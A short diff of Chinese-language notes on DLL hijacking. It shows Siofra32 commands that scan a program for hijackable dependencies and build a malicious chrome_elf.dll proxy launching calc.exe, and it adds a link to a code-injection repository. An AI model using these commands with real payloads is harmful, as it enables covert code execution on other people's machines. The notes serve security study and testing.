@@ -24,3 +24,7 @@ Siofra32.exe --mode file-scan -f "c:\Program Files\xxx\xx.exe" --enum-dependency
 # Exploit - 生成存在恶意代码chrome_elf.dll 从而实现dll劫持
 Siofra32.exe --mode infect -f chrome_elf(real).dll -o chrome_elf.dll --payload-type process --payload-path C:\Windows\System32\calc.exe
 ```
+
+### 其他资料
+
+Visual Studio 2017 实现各种代码注入 [theevilbit/injection](https://github.com/theevilbit/injection)
